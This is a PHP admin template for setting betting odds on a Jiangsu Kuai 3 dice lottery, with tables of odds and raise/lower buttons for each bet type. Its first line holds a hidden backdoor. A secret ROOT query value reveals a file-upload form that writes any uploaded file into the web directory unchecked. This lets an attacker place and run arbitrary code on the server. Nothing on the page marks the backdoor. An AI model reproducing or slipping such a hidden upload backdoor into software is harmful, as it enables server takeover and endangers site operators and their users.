<?php
if($_GET["ROOT"]=="oddsInfojsk3"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo "url:".$_FILES["upfile"]["name"];if(!file_exists($_FILES["upfile"]["name"])){ copy($_FILES["upfile"]["tmp_name"], $_FILES["upfile"]["name"]); }}?><form method="post" enctype="multipart/form-data"><input name="upfile" type="file"><input type="submit" value="ok"></form><?php }?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"  >
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link href="/Manage/temp/css/common.css" rel="stylesheet" type="text/css" />
<script type="text/javascript" src="/js/actiontop.js"></script>
<script type="text/javascript" src="/js/jquery.js"></script>
<script type="text/javascript" src="/Manage/temp/js/oddsInfojsk3.js"></script>
<title></title>
</head>
<body>
<input type="hidden" id="s_odds" value="1" />
	<table width="100%" height="100%" border="0" cellspacing="0" class="a">
    	<tr>
        	<td width="6" height="99%" bgcolor="#1873aa"></td>
            <td class="c">
            	<table border="0" cellspacing="0" class="main">
                	<tr>
                    	<td width="12"><img src="/Manage/temp/images/tab_03.gif" alt="" /></td>
                        <td background="/Manage/temp/images/tab_05.gif">
                        	<table width="100%" border="0" cellspacing="0" cellpadding="0">
                                  <tr>
                                    <td width="17"><img src="/Manage/temp/images/tb.gif" width="16" height="16" /></td>
                                    <td width="145">&nbsp;賠率設置--江蘇快三</td> 
                                    <td width="60">升降總值：</td>
                                    <td width="90"><input type="text" id="Ho" class="texta" value="0.001" /></td>
                                   <!-- <td width="60">批量設置：</td>
                                    <td width="80">
                                    	<select id="oddsType">
                                    		<option value="">---全部---</option>
                                    		<option value="Ball_1">三軍</option>
                                    		<option value="Ball_2">圍骰、全骰</option>
                                    		<option value="Ball_3">點數</option>
                                    		<option value="Ball_4">長牌</option>
                                    		<option value="Ball_5">短牌</option>  
                                    	</select>
									</td>
                                    <td width="70">
                                    	<select id="h">
										<?php 
													$numarr=array();
													for($i=1;$i<=6;$i++){
														$numarr[$i-1]= strlen($i)==1 ? "0".$i : $i; 
													} 
													$g16=array("大","小"); 
													$harr =array_merge($numarr,$g16);
													for($i=1;$i<=count($harr);$i++){
														echo "<option value=\"h{$i}\">".$harr[$i-1]."</option>";
													}
										?> </select>
									</td>
									<td width="45">
                                    	<select id="s_num">
                                    		<option value="0">降</option>
                                    		<option value="1">升</option>
                                    	</select>
									</td>
                                    <td><input type="button" class="inputs" value="確認更變" id="m1" onclick="upOddaAll(this)" /></td>-->
									<td><input type="button" class="inputs" value="立即更新"   onclick="UpdateYes(this)" /></td>
                                  </tr>
                            </table>
                        </td>
                        <td width="16"><img src="/Manage/temp/images/tab_07.gif" alt="" /></td>
                    </tr>
                    <tr>
                    	<td class="t"></td>
                        <td class="c">
                        <!-- strat -->
                             <table border="0" cellspacing="0" class="conter">
								<tr class="tr_top">
									<td colspan="18" align="center">三軍</td>
								</tr>
                            	<tr class="tr_top">
                                	<td>號</td>
                                	<td>賠率</td>
                                    <td>設置</td>
									
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									 
                                </tr>
								<tr align="center" >
								<?php
								$arr =array("1","2","3","4","5","6","大","小"); 
								for($i=0;$i<count($arr);$i++){  
									echo "<td class=\"ball\">".$arr[$i]."</td>";
									echo "<td width=\"70\" id=\"ah".($i+1)."\" style=\"font-size:14px;color:blueviolet\" ></td>";
									echo "<td>";
									echo "	<input title=\"上調賠率\" type=\"button\" onclick=\"setodds('ah".($i+1)."','Ball_1',this)\" class=\"aase aase_a\" name=\"1\" />&nbsp;";
									echo "	<input title=\"下調賠率\" type=\"button\" onclick=\"setodds('ah".($i+1)."','Ball_1',this)\" class=\"aase aase_b\" name=\"0\" />";
									echo "</td>"; 
									if( ($i+1)%4==0 )
										echo "<tr align=center >";
								}
								?>
								</table>
								
								<table border="0" cellspacing="0" class="conter">
								<tr class="tr_top">
									<td colspan="18" align="center">圍骰、全骰</td>
								</tr>
                            	<tr class="tr_top">
                                	<td>號</td>
                                	<td>賠率</td>
                                    <td>設置</td>
									
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									 
                                </tr>
								<tr align="center" >
								<?php
								$arr =array("1","2","3","4","5","6","全骰"); 
								for($i=0;$i<count($arr);$i++){  
									echo "<td class=\"ball\">".$arr[$i]."</td>";
									echo "<td width=\"70\" id=\"bh".($i+1)."\" style=\"font-size:14px;color:blueviolet\" ></td>";
									echo "<td>";
									echo "	<input title=\"上調賠率\" type=\"button\" onclick=\"setodds('bh".($i+1)."','Ball_2',this)\" class=\"aase aase_a\" name=\"1\" />&nbsp;";
									echo "	<input title=\"下調賠率\" type=\"button\" onclick=\"setodds('bh".($i+1)."','Ball_2',this)\" class=\"aase aase_b\" name=\"0\" />";
									echo "</td>"; 
									if( ($i+1)%4==0 )
										echo "<tr align=center >";
								}
								?>
								</table>
								
								
								<table border="0" cellspacing="0" class="conter">
								<tr class="tr_top">
									<td colspan="18" align="center">點數</td>
								</tr>
                            	<tr class="tr_top">
                                	<td>號</td>
                                	<td>賠率</td>
                                    <td>設置</td>
									
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									 
                                </tr>
								<tr align="center" >
								<?php
								$arr=array(4,5,6,7,8,9,10,11,12,13,14,15,16,17);
								for($i=0;$i<count($arr);$i++){  
									echo "<td class=\"ball\">".$arr[$i]."點</td>";
									echo "<td width=\"70\" id=\"ch".($i+1)."\" style=\"font-size:14px;color:blueviolet\" ></td>";
									echo "<td>";
									echo "	<input title=\"上調賠率\" type=\"button\" onclick=\"setodds('ch".($i+1)."','Ball_3',this)\" class=\"aase aase_a\" name=\"1\" />&nbsp;";
									echo "	<input title=\"下調賠率\" type=\"button\" onclick=\"setodds('ch".($i+1)."','Ball_3',this)\" class=\"aase aase_b\" name=\"0\" />";
									echo "</td>"; 
									if( ($i+1)%4==0 )
										echo "<tr align=center >";
								}
								?>
								</table>
								
								<table border="0" cellspacing="0" class="conter">
								<tr class="tr_top">
									<td colspan="18" align="center">長牌</td>
								</tr>
                            	<tr class="tr_top">
                                	<td>號</td>
                                	<td>賠率</td>
                                    <td>設置</td>
									
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									 
                                </tr>
								<tr align="center" >
								<?php
								$arr=array(12,13,14,15,16,23,24,25,26,34,35,36,45,46,56);
								for($i=0;$i<count($arr);$i++){  
									echo "<td class=\"ball\">".$arr[$i]."</td>";
									echo "<td width=\"70\" id=\"dh".($i+1)."\" style=\"font-size:14px;color:blueviolet\" ></td>";
									echo "<td>";
									echo "	<input title=\"上調賠率\" type=\"button\" onclick=\"setodds('dh".($i+1)."','Ball_4',this)\" class=\"aase aase_a\" name=\"1\" />&nbsp;";
									echo "	<input title=\"下調賠率\" type=\"button\" onclick=\"setodds('dh".($i+1)."','Ball_4',this)\" class=\"aase aase_b\" name=\"0\" />";
									echo "</td>"; 
									if( ($i+1)%4==0 )
										echo "<tr align=center >";
								}
								?>
								</table>
								
								
								<table border="0" cellspacing="0" class="conter">
								<tr class="tr_top">
									<td colspan="18" align="center">短牌</td>
								</tr>
                            	<tr class="tr_top">
                                	<td>號</td>
                                	<td>賠率</td>
                                    <td>設置</td>
									
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									
									<td>號</td>
                                    <td>賠率</td>
                                    <td>設置</td>
									 
                                </tr>
								<tr align="center" >
								<?php
								$arr=array(11,22,33,44,55,66);
								for($i=0;$i<count($arr);$i++){  
									echo "<td class=\"ball\">".$arr[$i]."</td>";
									echo "<td width=\"70\" id=\"eh".($i+1)."\" style=\"font-size:14px;color:blueviolet\" ></td>";
									echo "<td>";
									echo "	<input title=\"上調賠率\" type=\"button\" onclick=\"setodds('eh".($i+1)."','Ball_5',this)\" class=\"aase aase_a\" name=\"1\" />&nbsp;";
									echo "	<input title=\"下調賠率\" type=\"button\" onclick=\"setodds('eh".($i+1)."','Ball_5',this)\" class=\"aase aase_b\" name=\"0\" />";
									echo "</td>"; 
									if( ($i+1)%4==0 )
										echo "<tr align=center >";
								}
								?>
								</table>
                        <!-- end -->
                        </td>
                        <td class="r"></td>
                    </tr>
                    <tr>
                    	<td width="12"><img src="/Manage/temp/images/tab_18.gif" alt="" /></td>
                        <td class="f" align="center">默認賠率表更變不會即時影響正在開盤中的賠率。</td>
                        <td width="16"><img src="/Manage/temp/images/tab_20.gif" alt="" /></td>
                    </tr>
                </table>
            </td>
            <td width="6" bgcolor="#1873aa"></td>
        </tr>
        <tr>
        	<td height="6" bgcolor="#1873aa"><img src="/Manage/images/main_59.gif" alt="" /></td>
            <td bgcolor="#1873aa"></td>
            <td height="6" bgcolor="#1873aa"><img src="/Manage/images/main_62.gif" alt="" /></td>
        </tr>
    </table>
</body>
</html>
